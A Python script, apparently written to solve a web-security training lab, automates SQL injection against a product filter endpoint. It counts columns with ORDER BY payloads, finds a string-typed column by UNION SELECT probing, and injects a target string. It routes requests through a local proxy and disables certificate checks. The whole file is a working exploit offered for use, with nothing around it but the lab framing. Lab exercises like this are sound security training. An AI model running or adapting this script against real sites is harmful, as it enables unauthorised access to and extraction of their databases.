import urllib3
import sys
import requests
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def Number_of_cols(url:str):
    url = url + '/filter?category=Gifts'
    # The application uses this sql query to filter by category: SELECT * FROM products WHERE category = ''
    # Determining the number of columns so it help us in exploiting the sqli with union statement
    payload = "'ORDER BY "
    for i in range(1, 20):
        try:
            r = requests.get(url + payload + f"{i}--",verify=False, proxies=proxies)
            if r.status_code == 500:
                return i - 1
        except requests.exceptions.RequestException as ex:
            print(f"Error: {ex}")
            return None
    return None

def get_string_type_column(url:str, cols:int):
    num_of_nulls = cols * "NULL,"
    num_of_nulls = num_of_nulls.removesuffix(',')
    arr_nulls = num_of_nulls.split(',')
    for i in range(0, cols):
        arr_nulls[i] = "'a'"
        try:
            testing_url = url + '/filter?category=Gifts' + f"'UNION SELECT {','.join(arr_nulls)}" + "--"
            r = requests.get(testing_url, verify=False, proxies=proxies)
            if r.status_code == 500:
                arr_nulls[i] = 'NULL'
                testing_url = ''
            if r.status_code == 200:
                return testing_url
        except requests.exceptions.RequestException as ex:
            print(f"Error: {ex}")
            return None
    return None

def exploit(url:str):
    # Lab goal: Make the database retrieve the string: 'B0R7Y7'
    url = url.replace("'a'", "'B0R7Y7'")
    try:
        r = requests.get(url, proxies=proxies, verify=False)
        if r.status_code == 200:
            return True
        else:
            print("Failed to exploit")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')

    cols = Number_of_cols(url)
    if cols:
        print(f"Num of cols: {cols}")
    else:
        print("Failed to determine num of cols")
        sys.exit(-1)
    
    string_column = get_string_type_column(url, cols)
    if string_column:
        if exploit(string_column):
            print("Lab Solved!")
            sys.exit(0)
    else:
        print("Failed to extract the string column")
        sys.exit(-1)

if __name__ == '__main__':
    main()